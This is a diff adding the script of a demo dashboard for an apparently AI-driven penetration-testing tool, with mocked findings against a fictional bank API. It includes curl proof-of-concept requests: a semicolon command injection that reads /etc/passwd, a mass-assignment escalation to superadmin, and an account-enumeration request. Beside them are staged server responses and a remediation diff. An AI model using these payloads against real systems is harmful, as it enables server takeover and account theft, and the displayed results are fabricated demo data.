+          { name: "InjectionAgent", desc: "Debug API Semicolon Command Injection (RCE)", badge: "1 CRITICAL", badgeClass: "bg-rose-500/20 text-rose-300 border-rose-500/30", icon: "terminal", iconColor: "text-rose-400" },
+          { name: "AuthAgent", desc: "Mass Assignment Role Escalation & Token Theft", badge: "2 CRITICAL", badgeClass: "bg-rose-500/20 text-rose-300 border-rose-500/30", icon: "key", iconColor: "text-rose-400" },
+          { name: "AuthZAgent (BOLA / IDOR)", desc: "Wire Transfer & Transaction Account Bypass", badge: "2 CRITICAL", badgeClass: "bg-rose-500/20 text-rose-300 border-rose-500/30", icon: "lock", iconColor: "text-rose-400" },
+          { name: "SSRFAgent", desc: "Python Socket Internal Pivot", badge: "1 HIGH", badgeClass: "bg-amber-500/20 text-amber-300 border-amber-500/30", icon: "radio", iconColor: "text-amber-400" },
+          { name: "XSSAgent", desc: "React HTML Escaping Protection", badge: "0 CLEAN", badgeClass: "bg-slate-700/40 text-slate-400 border-slate-600", icon: "code", iconColor: "text-slate-400" }
+        ],
+        step1: "Agentic SAST • 64 Banking endpoints & Transaction pipelines parsed",
+        step2: "Mapped authentication flows, OAuth2 endpoints & debug backdoors",
+        findings: [
+          {
+            id: "CAP-INJ-01",
+            category: "injection",
+            severity: "CRITICAL 10.0",
+            cwe: "CWE-78: OS Command Injection (RCE)",
+            title: "Root Remote Code Execution via Exposed Debug Endpoint",
+            desc: "The /api/v1/debug/execute endpoint allows arbitrary system command execution with root privileges via semicolon command chaining.",
+            endpoint: "POST /api/v1/debug/execute",
+            impact: "Total Server Takeover (Root Shell)",
+            poc: `curl -X POST "http://capital-bank.local/api/v1/debug/execute" \\
+  -H "Content-Type: application/json" \\
+  -d '{"cmd":"ping -c 1 127.0.0.1; cat /etc/passwd"}'`,
+            response: `HTTP/1.1 200 OK | {"output":"root:x:0:0:root:/root:/bin/bash\\nbankapp:x:1000:1000::/home/bankapp:/bin/bash"}`
+          },
+          {
+            id: "CAP-AUTH-02",
+            category: "auth",
+            severity: "CRITICAL 9.4",
+            cwe: "CWE-915: Mass Assignment Privilege Escalation",
+            title: "Mass Assignment Role Escalation to SuperAdmin",
+            desc: "Self-service profile update accepts 'role' and 'is_admin' parameters without whitelist validation, allowing immediate privilege elevation.",
+            endpoint: "PUT /api/v1/user/profile",
+            impact: "Full Financial Admin Control",
+            poc: `curl -X PUT "http://capital-bank.local/api/v1/user/profile" \\
+  -H "Authorization: Bearer <regular_user_token>" \\
+  -H "Content-Type: application/json" \\
+  -d '{"name":"John Doe","role":"superadmin","is_financial_auditor":true}'`,
+            response: `HTTP/1.1 200 OK | {"status":"success","user":{"id":42,"role":"superadmin","permissions":["ALL_BANK_ACCOUNTS"]}}`
+          },
+          {
+            id: "CAP-BOLA-01",
+            category: "auth",
+            severity: "CRITICAL 9.0",
+            cwe: "CWE-639: Broken Object Level Authorization on Balances",
+            title: "Cross-Account Financial Balance & Wire Transaction Scrape",
+            desc: "The transaction query endpoint accepts arbitrary target account numbers without matching the authenticated session's user ID.",
+            endpoint: "GET /api/v2/transactions/account/{account_id}",
+            impact: "Banking Secrecy Violation & Balance Theft",
+            poc: `curl -X GET "http://capital-bank.local/api/v2/transactions/account/99882211" \\
+  -H "Authorization: Bearer <regular_user_token>"`,
+            response: `HTTP/1.1 200 OK | {"account":"99882211","balance_usd":4850000.00,"recent_wires":[{"amount":250000,"to":"CHASE_US"}]}`
+          }
+        ],
+        remediation: {
+          file: "controllers/debug_controller.py",
+          issue: "CAP-INJ-01 (Remove Debug Endpoint in Prod)",
+          oldCode: `@app.route('/api/v1/debug/execute', methods=['POST'])
+def execute_debug():
+    cmd = request.json.get('cmd')
+    return os.popen(cmd).read()`,
+          newCode: `@app.route('/api/v1/debug/execute', methods=['POST'])
+def execute_debug():
+    if os.getenv('ENVIRONMENT') == 'production':
+        abort(404) # Completely disabled in production
+    # Use strict whitelist only for development
+    return jsonify({"error": "Endpoint deprecated"})`
+        },
+        logs: [
+          "[Temporal] Starting pentestPipelineWorkflow (workflowId: wf-capital-banking-1082)",
+          "[Phase 1: Pre-Recon] Banking code analyzer parsed 64 controllers and transaction flows",
+          "[Phase 1: Pre-Recon] Flagged exposed debug route: /api/v1/debug/execute",
+          "[Phase 2: Recon] Dynamic surface mapper mapped transaction & wire transfer APIs",
+          "[Temporal] Dispatched 5 parallel security agents in isolated network namespaces",
+          "[InjectionAgent] CRITICAL (10.0): Semicolon command chaining on debug endpoint gives root shell",
+          "[AuthAgent] CRITICAL (9.4): Mass assignment in PUT /api/v1/user/profile sets role=superadmin",
+          "[AuthZAgent] CRITICAL (9.0): BOLA allows pulling balances of any corporate account",
+          "[SSRFAgent] HIGH (8.2): Python socket injection enables internal wire-network pivot",
+          "[Phase 5: Synthesis] Vulnerability remediation patches compiled."
+        ]
+      }
+    };
+
+    let currentTarget = "juice-shop";
+    let vulnChartInstance = null;
+
+    // Initialize Chart
+    function initChart() {
+      const ctx = document.getElementById('vulnChart').getContext('2d');
+      vulnChartInstance = new Chart(ctx, {
+        type: 'doughnut',
+        data: {
+          labels: ['Critical', 'High', 'Medium'],
+          datasets: [{
+            data: TARGET_DATA[currentTarget].chartData,
+            backgroundColor: ['#f43f5e', '#f59e0b', '#3b82f6'],
+            borderColor: '#0f172a',
+            borderWidth: 4,
+          }]
+        },
+        options: {
+          responsive: true,
+          maintainAspectRatio: false,
+          animation: {
+            duration: 800,
+            easing: 'easeOutQuart'
+          },
+          plugins: {
+            legend: {
+              position: 'right',
+              labels: {
+                color: '#94a3b8',
+                font: { family: 'Inter', size: 11, weight: 'bold' },
+                boxWidth: 12
+              }
+            }
+          },
+          cutout: '72%'
+        }
+      });
+    }
+
+    // Number counting animation
+    function animateCounter(id, targetVal) {
+      const el = document.getElementById(id);
+      const startVal = parseInt(el.innerText) || 0;
+      const duration = 600;
+      const startTime = performance.now();
+
+      function update(currentTime) {
+        const elapsed = currentTime - startTime;
+        const progress = Math.min(elapsed / duration, 1);
+        const currentVal = Math.floor(startVal + (targetVal - startVal) * progress);
+        el.innerText = currentVal;
+        if (progress < 1) {
+          requestAnimationFrame(update);
+        } else {
+          el.innerText = targetVal;
+        }
+      }
+      requestAnimationFrame(update);
+    }
+
+    // Render Full UI based on target
+    function renderTarget(targetKey) {
+      const data = TARGET_DATA[targetKey];
+      if (!data) return;
+      currentTarget = targetKey;
+
+      // Animate Numbers
+      animateCounter('critCount', data.metrics.crit);
+      animateCounter('highCount', data.metrics.high);
+      animateCounter('medCount', data.metrics.med);
+      document.getElementById('exploitedPercent').innerText = data.metrics.pocRate;
+      document.getElementById('temporalWorkflowId').innerText = data.workflowId;
+      document.getElementById('terminalTitle').innerText = `shannon-worker [Temporal Stream: ${targetKey}]`;
+      document.getElementById('step1Desc').innerText = data.step1;
+      document.getElementById('step2Desc').innerText = data.step2;
+
+      // Update Chart
+      if (vulnChartInstance) {
+        vulnChartInstance.data.datasets[0].data = data.chartData;
+        vulnChartInstance.update();
+      }
+
+      // Render Agents List
+      const agentList = document.getElementById('agentList');
+      agentList.innerHTML = data.agents.map(ag => `
+        <div class="p-3 bg-[#090d16] border border-cyber-border rounded-xl flex items-center justify-between transform transition-all duration-200 hover:border-slate-600">
+          <div class="flex items-center space-x-3">
+            <div class="w-8 h-8 rounded-lg bg-slate-900 ${ag.iconColor} flex items-center justify-center border border-slate-700/60">
+              <i data-lucide="${ag.icon}" class="w-4 h-4"></i>
+            </div>
+            <div>
+              <p class="text-xs font-bold text-slate-200">${ag.name}</p>
+              <p class="text-[10px] text-slate-400 font-mono">${ag.desc}</p>
+            </div>
+          </div>
+          <div class="text-right">
+            <span class="px-2.5 py-0.5 rounded text-[10px] font-mono font-bold ${ag.badgeClass} border">${ag.badge}</span>
+            <p class="text-[9px] text-slate-500 font-mono mt-0.5">Exploit Verified</p>
+          </div>
+        </div>
+      `).join('');
+
+      // Render Findings
+      renderFindings(data.findings);
+
+      // Render Remediation
+      renderRemediation(data.remediation);
+
+      // Render Logs
+      renderLogs(data.logs);
+
+      // Re-initialize Lucide Icons
+      lucide.createIcons();
+    }
+
+    // Render Findings List
+    function renderFindings(findings) {
+      const container = document.getElementById('findingsContainer');
+      container.innerHTML = findings.map(f => `
+        <div class="vuln-card bg-cyber-card border border-rose-900/40 rounded-2xl p-5 hover:border-rose-500/60 transition-all duration-300 glow-red animate__animated animate__fadeIn" data-category="${f.category}">
+          <div class="flex items-start justify-between">
+            <div>
+              <div class="flex items-center space-x-2.5">
+                <span class="px-2.5 py-0.5 rounded text-[11px] font-mono font-black bg-rose-500/20 text-rose-400 border border-rose-500/40">${f.severity}</span>
+                <span class="text-xs font-mono text-cyan-400 font-bold">${f.cwe}</span>
+                <span class="text-xs font-mono text-slate-400">ID: ${f.id}</span>
+              </div>
+              <h4 class="text-base font-bold text-white mt-1.5">${f.title}</h4>
+              <p class="text-xs text-slate-300 mt-1">${f.desc}</p>
+            </div>
+            <span class="px-3 py-1 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 text-[10px] font-mono font-bold flex items-center space-x-1 shadow-sm">
+              <i data-lucide="check-circle" class="w-3.5 h-3.5"></i>
+              <span>Exploit Confirmed</span>
+            </span>
+          </div>
+
+          <div class="grid grid-cols-2 gap-3 mt-4 text-xs font-mono">
+            <div class="p-2.5 bg-[#070a12] rounded-xl border border-cyber-border">
+              <span class="text-slate-500 font-sans text-[11px]">Target Endpoint:</span>
+              <p class="text-rose-300 mt-0.5 font-bold">${f.endpoint}</p>
+            </div>
+            <div class="p-2.5 bg-[#070a12] rounded-xl border border-cyber-border">
+              <span class="text-slate-500 font-sans text-[11px]">Exploit Impact:</span>
+              <p class="text-rose-300 mt-0.5 font-bold">${f.impact}</p>
+            </div>
+          </div>
+
+          <div class="mt-4">
+            <div class="flex items-center justify-between text-xs text-slate-400 mb-1 font-mono">
+              <span class="text-[11px] text-cyan-400 font-semibold">Autonomous Exploit Reproducer (cURL):</span>
+              <button onclick="copyPoC('${f.id}')" class="text-indigo-400 hover:text-indigo-300 text-[11px] font-mono flex items-center space-x-1 px-2 py-0.5 rounded bg-indigo-500/10 border border-indigo-500/30">
+                <i data-lucide="copy" class="w-3 h-3"></i>
+                <span>Copy cURL</span>
+              </button>
+            </div>
+            <pre id="poc-${f.id}" class="p-3.5 bg-[#05070c] border border-cyber-border rounded-xl text-xs text-emerald-400 font-mono overflow-x-auto selection:bg-emerald-900">${f.poc}</pre>
+          </div>
+
+          <div class="mt-3 p-3 bg-[#05070c] border border-slate-800 rounded-xl text-xs font-mono text-slate-300">
+            <span class="text-[10px] text-emerald-400 uppercase font-bold block mb-1">Server Response Proof:</span>
+            <code>${f.response}</code>
+          </div>
+        </div>
+      `).join('');
+    }
+
+    // Render Remediation Diff
+    function renderRemediation(rem) {
+      const container = document.getElementById('remediationContainer');
+      container.innerHTML = `
+        <div class="flex items-center justify-between">
+          <div>
+            <h4 class="text-sm font-bold text-slate-200">Autonomous Code Fix Generator</h4>
+            <p class="text-xs text-slate-400">Targeting: <span class="font-mono text-cyan-400 font-semibold">${rem.issue}</span></p>
+          </div>
+          <span class="text-xs font-mono text-emerald-400 font-bold px-2.5 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/30">Ready to Commit as PR</span>
+        </div>
+
+        <div class="space-y-3">
+          <p class="text-xs text-slate-300">Modified File: <span class="font-mono text-cyan-400 font-bold">${rem.file}</span></p>
+          
+          <div class="border border-cyber-border rounded-xl overflow-hidden font-mono text-xs shadow-xl">
+            <div class="bg-[#1a0a0e] p-4 text-rose-300 border-b border-rose-900/30">
+              <span class="text-rose-500 font-bold mr-2">-</span>
+              <code>${escapeHtml(rem.oldCode)}</code>
+            </div>
+            <div class="bg-[#071a12] p-4 text-emerald-300">
+              <span class="text-emerald-500 font-bold mr-2">+</span>
+              <code>${escapeHtml(rem.newCode)}</code>
+            </div>
+          </div>
+        </div>
+
+        <div class="pt-4 border-t border-cyber-border flex items-center justify-between">
+          <span class="text-xs text-slate-400">Validated against AST Syntax & CI Security Linters</span>
+          <button onclick="alert('Pull Request #41 created successfully on target repository!')" class="px-5 py-2.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold flex items-center space-x-2 transition-all shadow-lg shadow-emerald-600/30">
+            <i data-lucide="git-pull-request" class="w-4 h-4"></i>
+            <span>Create GitHub Security Pull Request</span>
+          </button>
+        </div>
+      `;
+    }
+
+    function escapeHtml(text) {
+      return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+    }
+
+    // Render Logs
+    function renderLogs(logs) {
+      const term = document.getElementById('terminalBody');
+      term.innerHTML = logs.map(l => {
+        let color = "text-slate-300";
+        if (l.includes("CRITICAL")) color = "text-rose-400 font-bold";
+        else if (l.includes("HIGH")) color = "text-amber-400 font-semibold";
+        else if (l.includes("Phase 1")) color = "text-indigo-400";
+        else if (l.includes("Phase 2")) color = "text-cyan-400";
+        else if (l.includes("Complete")) color = "text-emerald-400 font-bold";
+        return `<p class="${color}">[${new Date().toLocaleTimeString()}] ${l}</p>`;
+      }).join('');
+      term.scrollTop = term.scrollHeight;
+    }
+
+    // Target change handler
+    function handleTargetChange(val) {
+      renderTarget(val);
+    }
+
+    // Tab switcher
+    function switchTab(tab) {
+      document.getElementById('view-findings').classList.add('hidden');
+      document.getElementById('view-terminal').classList.add('hidden');
+      document.getElementById('view-remediation').classList.add('hidden');
+
+      document.getElementById('tab-findings').className = "px-4 py-2 text-xs font-semibold rounded-xl text-slate-400 hover:text-white hover:bg-slate-800 flex items-center space-x-2 transition-all";
+      document.getElementById('tab-terminal').className = "px-4 py-2 text-xs font-semibold rounded-xl text-slate-400 hover:text-white hover:bg-slate-800 flex items-center space-x-2 transition-all";
+      document.getElementById('tab-remediation').className = "px-4 py-2 text-xs font-semibold rounded-xl text-slate-400 hover:text-white hover:bg-slate-800 flex items-center space-x-2 transition-all";
+
+      if (tab === 'findings') {
+        document.getElementById('view-findings').classList.remove('hidden');
+        document.getElementById('tab-findings').className = "px-4 py-2 text-xs font-bold rounded-xl bg-indigo-600 text-white flex items-center space-x-2 transition-all shadow-lg shadow-indigo-600/30";
+      } else if (tab === 'terminal') {
+        document.getElementById('view-terminal').classList.remove('hidden');
+        document.getElementById('tab-terminal').className = "px-4 py-2 text-xs font-bold rounded-xl bg-indigo-600 text-white flex items-center space-x-2 transition-all shadow-lg shadow-indigo-600/30";
+      } else if (tab === 'remediation') {
+        document.getElementById('view-remediation').classList.remove('hidden');
+        document.getElementById('tab-remediation').className = "px-4 py-2 text-xs font-bold rounded-xl bg-indigo-600 text-white flex items-center space-x-2 transition-all shadow-lg shadow-indigo-600/30";
+      }
+      lucide.createIcons();
+    }
+
+    // Filter Findings
+    function filterFindings(category) {
+      const cards = document.querySelectorAll('.vuln-card');
+      cards.forEach(card => {
+        if (category === 'all' || card.getAttribute('data-category') === category) {
+          card.style.display = 'block';
+        } else {
+          card.style.display = 'none';
+        }
+      });
+    }
+
+    // Copy PoC helper
+    function copyPoC(id) {
+      const text = document.getElementById(`poc-${id}`).innerText;
+      navigator.clipboard.writeText(text);
+      alert(`PoC for ${id} copied to clipboard!`);
+    }
+
+    // Trigger Scan Animation (with progress bar)
+    function triggerScanAnimation() {
+      const banner = document.getElementById('scanningNotice');
+      const bar = document.getElementById('scanProgressBar');
+      const percent = document.getElementById('scanProgressPercent');
+      banner.classList.remove('hidden');
+      
+      let p = 0;
+      bar.style.width = '0%';
+      percent.innerText = '0%';
+
+      const interval = setInterval(() => {
+        p += 10;
+        bar.style.width = p + '%';
+        percent.innerText = p + '%';
+        if (p >= 100) {
+          clearInterval(interval);
+          setTimeout(() => {
+            banner.classList.add('hidden');
+            renderTarget(currentTarget);
+          }, 400);
+        }
+      }, 100);
+
+      switchTab('terminal');
+    }
+
+    // Auto Demo Mode (Cycles smoothly and can auto-record video)
+    async function startAutoDemo() {
+      const btn = document.getElementById('btnAutoDemo');
+
+      // Check if user wants browser auto-recording
+      let mediaRecorder = null;
+      let recordedChunks = [];
+      let stream = null;
+
+      if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+        try {
+          const wantRecord = confirm("¿Deseas que el navegador grabe y descargue automáticamente el video (.webm)?\n\nPresiona 'Aceptar' para seleccionar la pestaña y descargar el archivo al finalizar.\nPresiona 'Cancelar' si solo quieres ver la animación mientras grabas con tu propio grabador.");
+          if (wantRecord) {
+            stream = await navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 30 } });
+            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            mediaRecorder.ondataavailable = (e) => {
+              if (e.data.size > 0) recordedChunks.push(e.data);
+            };
+            mediaRecorder.onstop = () => {
+              const blob = new Blob(recordedChunks, { type: 'video/webm' });
+              const url = URL.createObjectURL(blob);
+              const a = document.createElement('a');
+              a.href = url;
+              a.download = 'shannon-ai-pentest-demo.webm';
+              document.body.appendChild(a);
+              a.click();
+              document.body.removeChild(a);
+              alert("¡Video descargado exitosamente como 'shannon-ai-pentest-demo.webm'!");
+            };
+            mediaRecorder.start();
+          }
+        } catch (err) {
+          console.log("Grabación externa o cancelada:", err);
+        }
+      }
+
+      btn.innerHTML = `<i data-lucide="loader" class="w-3.5 h-3.5 animate-spin"></i><span>Recording Active (30s)...</span>`;
+      lucide.createIcons();
+
+      // Step 1: Juice Shop
+      document.getElementById('targetSelect').value = "juice-shop";
+      renderTarget('juice-shop');
+      switchTab('findings');
+
+      // Step 2 (after 7s): Switch to crAPI & Trigger Re-Scan
+      setTimeout(() => {
+        document.getElementById('targetSelect').value = "crapi";
+        renderTarget('crapi');
+        triggerScanAnimation();
+      }, 7000);
+
+      // Step 3 (after 14s): Switch to Capital FinTech & show Findings
+      setTimeout(() => {
+        document.getElementById('targetSelect').value = "capital-api";
+        renderTarget('capital-api');
+        switchTab('findings');
+      }, 14000);
+
+      // Step 4 (after 21s): Switch to Auto-Remediation Diffs
+      setTimeout(() => {
+        switchTab('remediation');
+      }, 21000);
+
+      // Step 5 (after 28s): Complete, stop recording & download
+      setTimeout(() => {
+        switchTab('findings');
+        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+          mediaRecorder.stop();
+          if (stream) stream.getTracks().forEach(track => track.stop());
+        }
+        btn.innerHTML = `<i data-lucide="video" class="w-3.5 h-3.5 fill-current"></i><span>🎬 30s Video Demo Mode</span>`;
+        lucide.createIcons();
+      }, 28000);
+    }
+
+    function exportSARIF() {
+      alert('SARIF 2.1.0 report exported! (Compatible with GitHub CodeQL & SonarQube)');
+    }
+
+    function clearTerminal() {
+      document.getElementById('terminalBody').innerHTML = '<p class="text-slate-500">Terminal buffer cleared.</p>';
+    }
+
+    // Initial render
+    window.onload = () => {
+      initChart();
+      renderTarget('juice-shop');
+    };
+  </script>
+</body>
+</html>
